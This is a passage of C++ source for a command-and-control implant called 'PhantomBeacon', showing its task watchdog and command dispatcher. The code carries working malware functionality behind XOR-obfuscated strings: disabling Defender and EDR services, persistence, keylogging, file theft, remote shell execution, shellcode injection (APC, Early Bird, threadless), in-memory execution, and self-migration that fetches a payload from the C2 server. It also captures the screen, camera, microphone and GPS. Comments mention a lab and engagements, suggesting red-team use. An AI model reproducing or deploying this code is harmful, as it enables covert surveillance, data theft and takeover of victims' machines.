    return run_shell_command_bounded(cmd, DEFAULT_TASK_TIMEOUT_MS);
}
// ── Task Watchdog ──────────────────────────────────────────────────────────
// A blocking task (camera Media Foundation ReadSample, a long media
// capture, a hung shell pipe) must NEVER wedge the whole beacon loop:
// while a task is stuck the beacon stops checking in, the C2 shows the
// task as "sent" forever, and every later task (gps, screenshot, ...)
// queues up behind it. So each task runs on a worker thread under a bounded
// wait, and on timeout the beacon reports the task dead and moves on.
//
// The bug this used to have: the run's state lived in a `TaskRun` on THIS
// frame, the worker got a raw pointer to it, and the timeout path called
// detach() and returned. The worker woke up later and wrote
// `tr->output = ...; tr->done = true` into a stack frame that no longer
// existed — a use-after-free that corrupted the beacon's own stack and could
// kill the implant mid-engagement. It also had no way to stop the command:
// the timeout ended the beacon's WAIT, not the command.
//
// Now the run is a shared_ptr (task::Run) that the watchdog, the worker, and
// the registry all reference, so the storage outlives every one of them. A
// worker that finishes after a cancellation finds a live object, sees the
// cancel flag, and drops its result instead of publishing output for a task
// the C2 has already been told is dead. See task_lifecycle.h.

std::string dispatch_command(const std::string& cmd, net::C2Config& cfg);

static std::string run_task_with_timeout(
        const std::string& cmd,
        const std::shared_ptr<net::C2Config>& cfg_owner,
        int timeout_ms = DEFAULT_TASK_TIMEOUT_MS) {
    // The cap is checked BEFORE the thread exists. It exists to stop
    // SPAWNING stranded workers, and the old check ran after the spawn, so it
    // could never prevent one. A refusal is a DECISION, not a wait.
    if (task::Registry::instance().live() >= static_cast<size_t>(task::kMaxDetached)) {
        return "[TASK_REFUSED] '" + cmd.substr(0, 48) + "' not started: " +
               std::to_string(task::kMaxDetached) +
               " tasks already stuck (beacon state degraded)\n";
    }

    // Capture BY VALUE for `cmd`, and hand the config over as the shared_ptr
    // it now is. `cmd` is `task.command` -> an element of the caller's
    // block-scoped vector, rebuilt on every poll: a detached worker that
    // outlived that block used to read a freed std::string. The shared_ptr
    // keeps the config alive for as long as the worker may run.
    auto run = std::make_shared<task::Run>(
        [cmd, cfg_owner]() { return dispatch_command(cmd, *cfg_owner); });
    run->mark_running();

    auto work_fn = [run]() {
        const std::string out = run->work()();
        // publish() is a no-op when the watchdog already gave up, which is
        // the whole point: no write to a dead object, no late result.
        run->publish(out);
        // Tell the registry the THREAD is gone, THEN drop our reference: the
        // registry must not treat this run as reapable while we are still
        // inside it (that is what made the stranded-worker cap unreachable).
        run->mark_worker_exited();
        task::Registry::instance().release(run.get());
    };

#if PHANTOM_SHELL_TRACE
    // CreateThread rather than std::thread: the CRT/winpthreads trampoline
    // would run mapped-image code before _ph_thread_attach can initialize the
    // image TLS block. The raw entry point does the attach as its first act.
    struct RawWorker {
        HANDLE h = nullptr;
        void join() {
            if (h) {
                WaitForSingleObject(h, INFINITE);
                CloseHandle(h);
                h = nullptr;
            }
        }
        void detach() {
            if (h) {
                CloseHandle(h);
                h = nullptr;
            }
        }
    };
    RawWorker worker;
    auto* ctx = new _PhRawWorkerCtx{std::function<void()>(work_fn)};
    worker.h = CreateThread(nullptr, 0, _ph_raw_worker_entry, ctx, 0, nullptr);
    if (!worker.h) {
        delete ctx;
        media_utils::xtrace("task:thread-create-failed");
        _ph_thread_attach();
        work_fn();
    }
#else
    std::thread worker(work_fn);
#endif

    // Bounded wait in small slices: a task that finishes early is noticed
    // quickly, and shutdown/Ctrl+C still lands promptly.
    int waited = 0;
    const int STEP = 50;
    while (!run->finished() && waited < timeout_ms) {
        Sleep(STEP);
        waited += STEP;
    }

    if (run->finished()) {
        worker.join();   // the worker is done, so this returns at once
        return run->output();
    }

    // Timed out. The worker is blocked somewhere we cannot reach (camera
    // driver, a pipe that never closes). Cancel it, register it as stranded,
    // and DETACH so the beacon keeps polling.
    //
    // NEVER join() here. join() waits for the THREAD, and the thread is
    // blocked by definition -- that is the only way to reach this branch --
    // so joining would wedge the beacon for ever, with no error and no
    // result: the operator sees a live implant that answers nothing. The
    // worker owns its own shared_ptr to `run`, so the storage stays valid
    // whether or not admit() registered it, and its release() is how the
    // registry learns the thread finally exited.
    run->request_cancel(task::State::kTimedOut);
    task::Registry::instance().admit(run);
    worker.detach();

    const char* name = task::state_name(task::State::kTimedOut);
    std::string head = cmd.substr(0, 48);
    return std::string("[") + name + "] '" + head + "' exceeded " +
           std::to_string(timeout_ms / 1000) +
           "s — process tree killed, beacon continues\n";
}
// ── Command Dispatcher ─────────────────────────────────────────────────────

// Health counters (written by the main loop, read by the `health` command)
static unsigned long g_checkins_ok = 0, g_checkins_fail = 0, g_tasks_done = 0;
static unsigned long long g_uptime_start = 0;
static std::string g_last_error;

std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
    // Parse command and arguments
    std::istringstream iss(cmd);
    std::string action;
    iss >> action;

#if PHANTOM_SHELL_TRACE
    // Diagnostic-only probe: create a child with the SIMPLE path
    // (media_utils::exec_cmd: no job object, no CREATE_SUSPENDED). It answers
    // whether CreateProcessA from the mapped image works at all, or only the
    // shell branch's job/pipe flags are at fault.
    if (action == XOR_DEC(XOR_STR("health")).c_str()) {
        std::string probe_arg;
        if ((iss >> probe_arg) && probe_arg == "__spawnprobe") {
            media_utils::xtrace("probe:enter");
            _ph_trace_image();
            _ph_trace_iat();
            _ph_trace_import("CreateProcessA",
                             reinterpret_cast<void**>(&CreateProcessA));
            _ph_trace_import("CreateProcessW",
                             reinterpret_cast<void**>(&CreateProcessW));

            HMODULE k32 = GetModuleHandleA("kernel32.dll");
            HMODULE kb = GetModuleHandleA("kernelbase.dll");
            void* gpaA = k32 ? reinterpret_cast<void*>(
                GetProcAddress(k32, "CreateProcessA")) : nullptr;
            void* gpaW = k32 ? reinterpret_cast<void*>(
                GetProcAddress(k32, "CreateProcessW")) : nullptr;
            void* kbA = kb ? reinterpret_cast<void*>(
                GetProcAddress(kb, "CreateProcessA")) : nullptr;
            void* kbW = kb ? reinterpret_cast<void*>(
                GetProcAddress(kb, "CreateProcessW")) : nullptr;

            // kernelbase FIRST. kernel32's CreateProcessA is a forwarding
            // wrapper that reshuffles ten arguments; if the direct kernelbase
            // export works from the mapped image, the fault is in that wrapper
            // (or the stack it reads), not in process creation.
            _ph_spawn_attempt("kb-a", false, false, false, kbA);
            _ph_spawn_attempt("kb-w", true, false, false, kbW);

            // Read the mapped image's real IAT slots. A slot that is neither
            // kernel32's wrapper nor kernelbase's implementation is a loader
            // import bug; calling it would just re-create the 0x3000000000
            // jump, so log and skip instead.
            BYTE* base = _ph_image_base();
            void** slotA = base ? _ph_find_iat(base, "CreateProcessA") : nullptr;
            void** slotW = base ? _ph_find_iat(base, "CreateProcessW") : nullptr;
            void* iatA = slotA ? *slotA : nullptr;
            void* iatW = slotW ? *slotW : nullptr;
            bool iatA_ok = iatA && (iatA == gpaA || iatA == kbA);
            bool iatW_ok = iatW && (iatW == gpaW || iatW == kbW);
            char ib[256];
            snprintf(ib, sizeof(ib), "iat:verify A=%p ok=%d W=%p ok=%d",
                     iatA, iatA_ok ? 1 : 0, iatW, iatW_ok ? 1 : 0);
            media_utils::xtrace(ib);
            if (iatA_ok)
                _ph_spawn_attempt("iat-a", false, false, false, iatA);
            else
                media_utils::xtrace("iat-a:skipped-bad-slot");
            if (iatW_ok)
                _ph_spawn_attempt("iat-w", true, false, false, iatW);
            else
                media_utils::xtrace("iat-w:skipped-bad-slot");

            // The GetProcAddress wrapper path last: if this is what faults,
            // the exported function was never the problem.
            _ph_spawn_attempt("gpa-a", false, false, false, gpaA);
            _ph_spawn_attempt("gpa-w", true, false, false, gpaW);
            _ph_spawn_attempt("pipes-a", false, true, false, iatA_ok ? iatA : nullptr);
            _ph_spawn_attempt("suspend-a", false, false, true, iatA_ok ? iatA : nullptr);
            _ph_spawn_attempt("pipes-suspend-a", false, true, true, iatA_ok ? iatA : nullptr);
            std::string probe_out = media_utils::exec_cmd("whoami");
            media_utils::xtrace("probe:done");
            return "PROBE[completed]" + std::string(" out=") +
                   (probe_out.empty() ? "empty" : probe_out.substr(0, 80));
        }
    }
#endif

    if (action == XOR_DEC(XOR_STR("edrcheck")).c_str()) {
#ifdef _WIN32
        // EDR situational awareness: userland hooks, known EDR drivers.
        // Read-only — run this FIRST on a new foothold.
        edrcheck::EdrReport rep;
        edrcheck::report(rep);
        std::ostringstream o;
        o << "ntdll_hooks=" << (rep.ntdll_hooked ? "YES" : "no")
          << " (" << rep.hooked_stubs << " stubs)\n"
          << "known_edr_drivers=" << rep.known_edr << "\n";
        if (rep.known_edr > 0) o << rep.drivers;
        o << "etw_ti=" << (rep.etw_ti_alive ? "assumed-alive" : "no") << "\n";
        return o.str();
#else
        // POSIX: same situational awareness as Windows (LSM / eBPF / audit /
        // known agents on Linux; SIP / system extensions on macOS).
        edrcheck::EdrReport rep;
        edrcheck::report(rep);
        return edrcheck::format(rep);
#endif
    }
    if (action == XOR_DEC(XOR_STR("edr-kill")).c_str()) {
        // Burn the defensive stack: disable Defender realtime + stop known
        // AV/EDR services (Windows) / daemons (Linux). Destructive — only
        // ever issued after `edrcheck` shows what is present. Needs SYSTEM
        // on Windows for the service stops to stick.
        return edrkill::kill_av();
    }
    if (action == XOR_DEC(XOR_STR("health")).c_str()) {
        // Beacon health self-report: cadence, uptime, counters, last error.
        unsigned long long now = (unsigned long long)time(nullptr);
        unsigned long long up = g_uptime_start ? (now - g_uptime_start) : 0;
        std::ostringstream o;
        o << "uptime_s=" << up
          << " checkins_ok=" << g_checkins_ok
          << " checkins_fail=" << g_checkins_fail
          << " tasks_done=" << g_tasks_done
          << " sleep_ms=" << cfg.sleep_ms
          << " jitter=" << cfg.jitter << "%"
          << " build=" << BUILD_ID;
        if (!g_last_error.empty()) o << " last_error=\"" << g_last_error << "\"";
        return o.str();
    }
    else if (action == XOR_DEC(XOR_STR("set-sleep")).c_str()) {
        // C2-driven cadence rotation mid-session (no beacon restart):
        // set-sleep <ms> [jitter%]
        int ms = -1, jit = -1;
        if (iss >> ms) { if (!(iss >> jit)) jit = cfg.jitter; }
        if (ms <= 0) return "Usage: set-sleep <ms> [jitter%]";
        if (jit < 0) jit = 0;
        if (jit > 100) jit = 100;
        cfg.sleep_ms = ms;
        cfg.base_sleep_ms = ms;
        cfg.jitter = jit;
        g_last_error = "";   // cadence rotation implies a healthy operator link
        return "Cadence set: " + std::to_string(ms) + "ms (jitter " +
               std::to_string(jit) + "%)";
    }
    else if (action == XOR_DEC(XOR_STR("recon")).c_str()) {
        std::string path;
        std::getline(iss >> std::ws, path);
        return recon::format_human(path);
    }
    else if (action == XOR_DEC(XOR_STR("ls")).c_str() || action == XOR_DEC(XOR_STR("dir")).c_str()) {
        std::string path;
        std::getline(iss >> std::ws, path);
        if (path.empty()) path = ".";
        auto entries = recon::list_directory(path);
        std::string out;
        for (auto& e : entries) {
            out += (e.isDir ? XOR_DEC(XOR_STR("[DIR]  ")).c_str() : XOR_DEC(XOR_STR("[FILE] ")).c_str());
            out += e.name;
            if (!e.isDir) { out += XOR_DEC(XOR_STR("  (")).c_str(); out += recon::i2s(e.size); out += XOR_DEC(XOR_STR(" bytes)")).c_str(); }
            out += XOR_DEC(XOR_STR("\n")).c_str();
        }
        return out;
    }
    else if (action == XOR_DEC(XOR_STR("drives")).c_str()) {
        auto drives = recon::enumerate_drives();
        std::string out;
        for (auto& d : drives) {
            int totalGB = static_cast<int>(d.totalBytes / (1073741824.0));
            int freeGB  = static_cast<int>(d.freeBytes  / (1073741824.0));
            out += d.letter + XOR_DEC(XOR_STR("  [")).c_str() + d.type + XOR_DEC(XOR_STR("]")).c_str()
                + XOR_DEC(XOR_STR("  Total: ")).c_str() + recon::i2s(totalGB) + XOR_DEC(XOR_STR(" GB")).c_str()
                + XOR_DEC(XOR_STR("  Free: ")).c_str() + recon::i2s(freeGB) + XOR_DEC(XOR_STR(" GB\n")).c_str();
        }
        return out;
    }
    else if (action == XOR_DEC(XOR_STR("whoami")).c_str()) {
#ifdef _WIN32
        char user[256] = {0}, computer[256] = {0};
        DWORD usize = sizeof(user), csize = sizeof(computer);
        if (!GetUserNameA(user, &usize)) strncpy(user, "unknown", sizeof(user) - 1);
        if (!GetComputerNameA(computer, &csize)) strncpy(computer, "unknown", sizeof(computer) - 1);
        return std::string(XOR_DEC(XOR_STR("User: ")).c_str()) + user + XOR_DEC(XOR_STR("\nComputer: ")).c_str() + computer + XOR_DEC(XOR_STR("\n")).c_str();
#else
        char hostname[256] = {0};
        gethostname(hostname, sizeof(hostname));
        const char* user = getenv("USER");
        if (!user) user = XOR_DEC(XOR_STR("unknown")).c_str();
        return std::string(XOR_DEC(XOR_STR("User: ")).c_str()) + user + XOR_DEC(XOR_STR("\nHostname: ")).c_str() + hostname + XOR_DEC(XOR_STR("\n")).c_str();
#endif
    }
    else if (action == XOR_DEC(XOR_STR("portfwd")).c_str()) {
        int localPort, remotePort;
        std::string remoteHost;
        if (iss >> localPort >> remoteHost >> remotePort) {
            return portfwd::start_forward(localPort, remoteHost, remotePort);
        }
        return XOR_DEC(XOR_STR("Usage: portfwd <local_port> <remote_host> <remote_port>")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("portfwd-stop")).c_str()) {
        return portfwd::stop_all_forwards();
    }
    else if (action == XOR_DEC(XOR_STR("download")).c_str()) {
        std::string filepath;
        std::getline(iss >> std::ws, filepath);
        if (filepath.empty()) return XOR_DEC(XOR_STR("Usage: download <filepath>")).c_str();

#ifdef _WIN32
        HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_READ, FILE_SHARE_READ,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE)
            return XOR_DEC(XOR_STR("Error: Cannot open file ")).c_str() + filepath;

        DWORD fileSize = GetFileSize(hFile, nullptr);
        if (fileSize == INVALID_FILE_SIZE || fileSize > 10 * 1024 * 1024) {
            CloseHandle(hFile);
            return XOR_DEC(XOR_STR("Error: File too large or invalid")).c_str();
        }

        std::vector<BYTE> buffer(fileSize);
        DWORD bytesRead;
        ReadFile(hFile, buffer.data(), fileSize, &bytesRead, nullptr);
        CloseHandle(hFile);

        buffer.resize(bytesRead);
        return XOR_DEC(XOR_STR("FILE_B64:")).c_str() + crypto::base64_encode(buffer);
#else
        std::ifstream file(filepath, std::ios::binary);
        if (!file) return XOR_DEC(XOR_STR("Error: Cannot open file ")).c_str() + filepath;

        file.seekg(0, std::ios::end);
        size_t fileSize = file.tellg();
        if (fileSize > 10 * 1024 * 1024) return XOR_DEC(XOR_STR("Error: File too large")).c_str();
        file.seekg(0, std::ios::beg);

        std::vector<BYTE> buffer(fileSize);
        file.read(reinterpret_cast<char*>(buffer.data()), fileSize);
        buffer.resize(file.gcount());
        return XOR_DEC(XOR_STR("FILE_B64:")).c_str() + crypto::base64_encode(buffer);
#endif
    }
    else if (action == XOR_DEC(XOR_STR("upload")).c_str()) {
        std::string filepath, b64data;
        iss >> filepath >> b64data;
        if (filepath.empty() || b64data.empty())
            return XOR_DEC(XOR_STR("Usage: upload <filepath> <base64_data>")).c_str();

        auto data = crypto::base64_decode(b64data);
#ifdef _WIN32
        HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_WRITE, 0,
            nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE)
            return XOR_DEC(XOR_STR("Error: Cannot create file ")).c_str() + filepath;

        DWORD bytesWritten;
        WriteFile(hFile, data.data(), static_cast<DWORD>(data.size()), &bytesWritten, nullptr);
        CloseHandle(hFile);
        return XOR_DEC(XOR_STR("Uploaded ")).c_str() + recon::i2s(bytesWritten) + XOR_DEC(XOR_STR(" bytes to ")).c_str() + filepath;
#else
        std::ofstream file(filepath, std::ios::binary);
        if (!file) return XOR_DEC(XOR_STR("Error: Cannot create file ")).c_str() + filepath;

        file.write(reinterpret_cast<const char*>(data.data()), data.size());
        return XOR_DEC(XOR_STR("Uploaded ")).c_str() + recon::i2s(data.size()) + XOR_DEC(XOR_STR(" bytes to ")).c_str() + filepath;
#endif
    }
    else if (action == XOR_DEC(XOR_STR("sysinfo")).c_str()) {
        return recon::get_sysinfo();
    }
    else if (action == XOR_DEC(XOR_STR("netinfo")).c_str()) {
        return recon::get_netinfo();
    }
    else if (action == XOR_DEC(XOR_STR("processes")).c_str()) {
        return recon::get_processes();
    }
    else if (action == XOR_DEC(XOR_STR("find")).c_str()) {
        std::string root, pattern;
        iss >> root >> pattern;
        if (root.empty() || pattern.empty()) return XOR_DEC(XOR_STR("Usage: find <root> <pattern>")).c_str();
        return recon::find_files(root, pattern);
    }
    else if (action == XOR_DEC(XOR_STR("pwd")).c_str()) {
#ifdef _WIN32
        char buf[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, buf);
        return std::string(buf) + XOR_DEC(XOR_STR("\n")).c_str();
#else
        char buf[1024];
        if (getcwd(buf, sizeof(buf))) return std::string(buf) + XOR_DEC(XOR_STR("\n")).c_str();
        return XOR_DEC(XOR_STR("Error getting current directory\n")).c_str();
#endif
    }
    else if (action == XOR_DEC(XOR_STR("cd")).c_str() || action == XOR_DEC(XOR_STR("cd..")).c_str()) {
        std::string path;
        if (action == XOR_DEC(XOR_STR("cd..")).c_str()) path = "..";
        else std::getline(iss >> std::ws, path);
        if (path.empty()) return XOR_DEC(XOR_STR("Usage: cd <path>")).c_str();
        
        // Strip quotes if present
        if (path.size() >= 2 && path.front() == '"' && path.back() == '"') {
            path = path.substr(1, path.size() - 2);
        }

#ifdef _WIN32
        if (SetCurrentDirectoryA(path.c_str())) return XOR_DEC(XOR_STR("Directory changed to ")).c_str() + path + XOR_DEC(XOR_STR("\n")).c_str();
#else
        if (chdir(path.c_str()) == 0) return XOR_DEC(XOR_STR("Directory changed to ")).c_str() + path + XOR_DEC(XOR_STR("\n")).c_str();
#endif
        return XOR_DEC(XOR_STR("Error changing directory\n")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("cat")).c_str()) {
        std::string path;
        std::getline(iss >> std::ws, path);
        if (path.empty()) return XOR_DEC(XOR_STR("Usage: cat <file>")).c_str();
        std::ifstream f(path, std::ios::binary);
        if (!f) return XOR_DEC(XOR_STR("Error: Cannot open file ")).c_str() + path;
        
        f.seekg(0, std::ios::end);
        size_t size = f.tellg();
        if (size > 1 * 1024 * 1024) return XOR_DEC(XOR_STR("Error: File too large to cat (max 1MB). Use download.")).c_str();
        f.seekg(0, std::ios::beg);
        
        std::string out;
        char buf[4096];
        while (f.read(buf, sizeof(buf))) out.append(buf, f.gcount());
        out.append(buf, f.gcount());
        return out;
    }
    else if (action == XOR_DEC(XOR_STR("persist")).c_str()) {
        std::string name;
        iss >> name;
        if (name.empty()) name = XOR_DEC(XOR_STR("PhantomBeacon")).c_str();
#ifdef _WIN32
        return persistence::establish_windows(cfg, name);
#else
        return persistence::establish_linux(name);
#endif
    }
    else if (action == XOR_DEC(XOR_STR("persist2")).c_str()) {
        // Strategy 2: no-admin Startup .cmd (no PE). Live-tested because
        // schtasks /sc onlogon is access-denied for this non-admin lab user.
        std::string name;
        iss >> name;
        if (name.empty()) name = XOR_DEC(XOR_STR("PhantomBeacon")).c_str();
#ifdef _WIN32
        return persistence::establish_windows_startup(cfg, name);
#else
        return XOR_DEC(XOR_STR("persist2 is Windows-only")).c_str();
#endif
    }
    else if (action == XOR_DEC(XOR_STR("unpersist")).c_str()) {
        // Remove EXACTLY what `persist` installed (same RunKey value /
        // systemd unit / autostart file / cron line / on-disk copy). The
        // report tells the client to clean up; this is the supported path.
        std::string name;
        iss >> name;
        if (name.empty()) name = XOR_DEC(XOR_STR("PhantomBeacon")).c_str();
#ifdef _WIN32
        return persistence::remove_windows(name);
#else
        return persistence::remove_posix(name);
#endif
    }
    else if (action == XOR_DEC(XOR_STR("sleep")).c_str()) {
        // sleep <ms> [jitter%] — reconfigure the beacon cadence at runtime.
        int ms = -1;
        int jit = -1;
        if (iss >> ms) { if (!(iss >> jit)) jit = cfg.jitter; }
        if (ms <= 0) return XOR_DEC(XOR_STR("Usage: sleep <ms> [jitter%] (e.g. sleep 30000 10)")).c_str();
        if (jit < 0) jit = 0;
        if (jit > 100) jit = 100;
        cfg.sleep_ms = ms;
        cfg.base_sleep_ms = ms;
        cfg.jitter = jit;
        return XOR_DEC(XOR_STR("Sleep set to ")).c_str() + std::to_string(ms) +
               XOR_DEC(XOR_STR("ms (jitter ")).c_str() + std::to_string(jit) +
               XOR_DEC(XOR_STR("%)")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("auth-rotate")).c_str()) {
#if BEACON_AUTH_ENABLED
        std::string encoded_secret;
        iss >> encoded_secret;
        auto next_secret = crypto::base64_decode(encoded_secret);
        if (next_secret.size() != crypto::AUTH_SECRET_LEN) {
            return "AUTH_ROTATE_ERROR: expected a 32-byte base64 secret";
        }
        if (!crypto::save_auth_secret(next_secret.data(), next_secret.size())) {
            return "AUTH_ROTATE_ERROR: secure state storage failed";
        }
        std::copy(next_secret.begin(), next_secret.end(), cfg.auth_secret.begin());
        return "AUTH_ROTATED";
#else
        return "AUTH_ROTATE_ERROR: beacon authentication is not enabled";
#endif
    }
    else if (action == XOR_DEC(XOR_STR("keylog")).c_str()) {
        std::string subCmd;
        iss >> subCmd;
        if (subCmd == XOR_DEC(XOR_STR("start")).c_str()) return keylogger::start();
        if (subCmd == XOR_DEC(XOR_STR("stop")).c_str())  return keylogger::stop();
        if (subCmd == XOR_DEC(XOR_STR("status")).c_str()) return keylogger::status();
        if (subCmd == XOR_DEC(XOR_STR("dump")).c_str()) {
            std::string filter;
            if (iss >> filter)
                return keylogger::dump(filter);
            return keylogger::dump();
        }
        return XOR_DEC(XOR_STR("Usage: keylog <start|stop|status|dump [process]>")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("shell")).c_str() || action == XOR_DEC(XOR_STR("exec")).c_str() || action == XOR_DEC(XOR_STR("run")).c_str()) {
        std::string shell_cmd;
        std::getline(iss >> std::ws, shell_cmd);
        if (shell_cmd.empty()) return XOR_DEC(XOR_STR("Usage: shell <command>")).c_str();
        return run_shell_command(shell_cmd);
    }
    else if (action == XOR_DEC(XOR_STR("exit")).c_str() || action == XOR_DEC(XOR_STR("kill")).c_str()) {
        // Adjacent literals are REQUIRED: in "\x02EX" the hex escape is
        // greedy and swallows the E (\x02E == 0x2E '.'), yielding a 3-byte
        // string that never matched the 4-byte sentinel — the beacon
        // ignored every kill and the task was redelivered for ever.
        return "\x01\x02" "EX";
    }
    else if (action == XOR_DEC(XOR_STR("inject")).c_str()) {
#ifdef _WIN32
        DWORD pid;
#else
        pid_t pid;
#endif
        std::string b64code;
        if (iss >> pid >> b64code) {
#ifdef _WIN32
            if (pid == GetCurrentProcessId()) return XOR_DEC(XOR_STR("Self-injection not allowed.")).c_str();
#endif
            auto code = crypto::base64_decode(b64code);
            for (auto& b : code) b ^= 0xAA;
#ifdef _WIN32
            // Prefer threadless APC (no new thread) — stealthiest first.
            if (apc::threadless_apc(pid, code))
                return XOR_DEC(XOR_STR("Injected via threadless APC (no new thread).")).c_str();
            // Fallback: remote thread injection
#endif
            std::string result = injection::inject_shellcode(pid, code);
            return result;
        }
        return XOR_DEC(XOR_STR("Usage: inject <pid> <base64_shellcode>")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("migrate")).c_str()) {
        std::string b64code;
        if (iss >> b64code) {
            auto code = crypto::base64_decode(b64code);
            for (auto& b : code) b ^= 0xAA;
            std::string result = injection::migrate_to_new_process(code);
            if (result.find("Migrated successfully") != std::string::npos) {
                return std::string("\x01\x02MG") + result;
            }
            return result;
        }
#ifdef _WIN32
        // Argument-less migrate: SELF-MIGRATION. Pull the PIC loader blob
        // (beacon.bin — same bytes that ran in-memory at deployment) from
        // the C2 with the embedded payload token, inject it into a
        // sacrificial suspended process, and exit this instance. The new
        // beacon re-checks-in with the same identity; the server-side
        // nonce-based replay guard accepts it (counter reset is expected
        // after a migration/restart).
        {
            // /x serves the XOR(0xAA)-wrapped loader+PE blob — the exact
            // bytes the deployment dropper executes in-memory. The 5th
            // argument is the beacon identity: without it http_request
            // sends no X-Beacon-Id header, and the server cannot resolve
            // the per-beacon download token (live defect 2026-10-19:
            // migrate died with "failed to fetch PIC payload (29 bytes)",
            // which is the 29-byte "Forbidden: Invalid auth token" body).
            std::string pic_xored = net::http_request(cfg,
                XOR_WDEC(XOR_WSTR(L"GET")).c_str(),
                XOR_WDEC(XOR_WSTR(L"/x")).c_str(), "", cfg.beacon_id);
            if (pic_xored.size() < 4096) {
                return "MIGRATE_ERROR: failed to fetch PIC payload from C2 (" +
                       std::to_string(pic_xored.size()) + " bytes)";
            }
            auto code = std::vector<unsigned char>(pic_xored.begin(), pic_xored.end());
            for (auto& b : code) b ^= 0xAA;
            std::string result = injection::migrate_to_new_process(code);
            if (result.find("Migrated successfully") != std::string::npos) {
                return std::string("\x01\x02MG") + result +
                       " (self-migrated from C2 PIC payload)";
            }
            return "MIGRATE_ERROR: " + result;
        }
#else
        return XOR_DEC(XOR_STR("Usage: migrate <base64_shellcode>")).c_str();
#endif
    }
    else if (action == XOR_DEC(XOR_STR("mem-run")).c_str()) {
#ifdef _WIN32
        std::string b64code;
        if (iss >> b64code) {
            auto code = crypto::base64_decode(b64code);
            std::string err;
            if (inmemory::run_shellcode(code, &err)) return XOR_DEC(XOR_STR("Shellcode executed in memory.")).c_str();
            return "MEM_RUN_ERROR: " + err;
        }
        return XOR_DEC(XOR_STR("Usage: mem-run <base64_shellcode>")).c_str();
#else
        std::string b64bin;
        if (iss >> b64bin) {
            auto bin = crypto::base64_decode(b64bin);
            if (inmemory::run_binary(bin)) return XOR_DEC(XOR_STR("Binary executed via memfd.")).c_str();
            return XOR_DEC(XOR_STR("Memfd execution failed.")).c_str();
        }
        return XOR_DEC(XOR_STR("Usage: mem-run <base64_binary>")).c_str();
#endif
    }
#ifdef _WIN32
    else if (action == XOR_DEC(XOR_STR("inject-eb")).c_str()) {
        // Early Bird APC: shellcode runs BEFORE the target's entry point.
        // Usage: inject-eb <exe_path> <base64_shellcode>
        std::string exePath, b64code;
        if (iss >> exePath >> b64code) {
            auto code = crypto::base64_decode(b64code);
            for (auto& b : code) b ^= 0xAA;
            std::wstring wpath(exePath.begin(), exePath.end());
            if (apc::early_bird_apc(wpath, code))
                return XOR_DEC(XOR_STR("Early Bird APC injection succeeded.")).c_str();
            return XOR_DEC(XOR_STR("Early Bird APC injection failed.")).c_str();
        }
        return XOR_DEC(XOR_STR("Usage: inject-eb <exe_path> <base64_shellcode>")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("inject-tl")).c_str()) {
        // Threadless APC: shellcode queued on EXISTING threads (no new thread).
        // Usage: inject-tl <pid> <base64_shellcode>
        DWORD pid;
        std::string b64code;
        if (iss >> pid >> b64code) {
            if (pid == GetCurrentProcessId())
                return XOR_DEC(XOR_STR("Self-injection not allowed.")).c_str();
            auto code = crypto::base64_decode(b64code);
            for (auto& b : code) b ^= 0xAA;
            if (apc::threadless_apc(pid, code))
                return XOR_DEC(XOR_STR("Threadless APC injection succeeded.")).c_str();
            return XOR_DEC(XOR_STR("Threadless APC injection failed.")).c_str();
        }
        return XOR_DEC(XOR_STR("Usage: inject-tl <pid> <base64_shellcode>")).c_str();
    }
#endif
    else if (action == "screenshot") {
        return screenshot::capture();
    }
    else if (action == "gps") {
        return media_gps::get_gps_info();
    }
    else if (action == "camera") {
        return media_camera::capture_image();
    }
    else if (action == "audio") {
        std::string duration;
        try {
            if (iss >> duration) {
                return media_audio::record_audio(std::stoi(duration));
            }
        } catch (...) { /* invalid argument: fall back to default */ }
        return media_audio::record_audio(5);
    }
    else if (action == "screen-record") {
        std::string duration;
        try {
            if (iss >> duration) {
                return media_screen::record_screen_passive(std::stoi(duration));
            }
        } catch (...) { /* fall back to default */ }
        return media_screen::record_screen_passive(5);
    }
    else if (action == "screen-record-live") {
        std::string duration;
        try {
            if (iss >> duration) {
                return media_screen::record_screen_live(std::stoi(duration));
            }
        } catch (...) { /* fall back to default */ }
        return media_screen::record_screen_live(5);
    }
    else if (action == "screen-dump") {
        return media_screen::dump_live_recording();
    }
    else if (action == "screen-stream") {
        // TRUE live: record 5s chunks and push each to the stream queue; the
        // main loop sends them to the C2 immediately so the operator watches
        // the screen while it is being recorded. `screen-stream-stop` halts.
        std::string duration;
        try {
            if (iss >> duration) {
                return media_screen::record_screen_stream(std::stoi(duration));
            }
        } catch (...) { /* fall back to default */ }
        return media_screen::record_screen_stream(60);
    }
    else if (action == "screen-stream-stop") {
        return media_screen::stop_screen_stream();
    }
    else if (action == XOR_DEC(XOR_STR("remote")).c_str()) {
        // Deploy the standalone Remote Session module (GUI takeover): fetch
        // the compiled binary from the C2 and execute it. The module
        // registers as its own R-… beacon and streams screen frames + input.
        // Usage: remote [host] [port] [use_https] — defaults to the same C2.
        std::string r_host = C2_HOST;
        int r_port = C2_PORT;
        int r_ssl = C2_USE_HTTPS;
        std::string tok;
        if (iss >> tok) r_host = tok;
        if (iss >> tok) r_port = std::atoi(tok.c_str());
        if (iss >> tok) r_ssl = std::atoi(tok.c_str());
        // Every platform ignores these overrides: the fetched module keeps
        // its own compiled C2 configuration. Keep accepting the legacy
        // trailing arguments, but document that they are intentionally not
        // consumed here (the old casts lived only in the Windows branch,
        // which made the POSIX build fail under -Werror).
        (void)r_host;
        (void)r_port;
        (void)r_ssl;
#ifdef _WIN32
        // The fetch always targets the configured C2 (http_request uses
        // cfg.host/cfg.port). The path carries NO query string: the
        // per-beacon token travels in X-Auth-Token, because a ?auth= query
        // used to break the HMAC signature (server signs request.path) and
        // the fetch failed 401 "Unauthorized" (12 bytes) — live defect
        // 2026-10-19. The _mem route serves the reflective loader + PE,
